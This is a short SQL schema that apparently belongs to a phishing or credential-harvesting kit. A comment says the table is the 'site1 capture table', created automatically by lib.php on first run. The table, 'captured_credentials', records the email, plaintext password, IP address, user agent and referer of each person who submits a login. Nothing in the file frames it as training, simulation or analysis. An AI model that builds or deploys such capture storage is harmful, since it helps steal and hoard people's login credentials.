-- site1 capture table (auto-created by lib.php on first run; here for reference).
CREATE TABLE IF NOT EXISTS captured_credentials (
    id          BIGINT AUTO_INCREMENT PRIMARY KEY,
    email       VARCHAR(320),
    password    VARCHAR(512),
    ip          VARCHAR(64),
    user_agent  VARCHAR(512),
    referer     VARCHAR(1024),
    created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
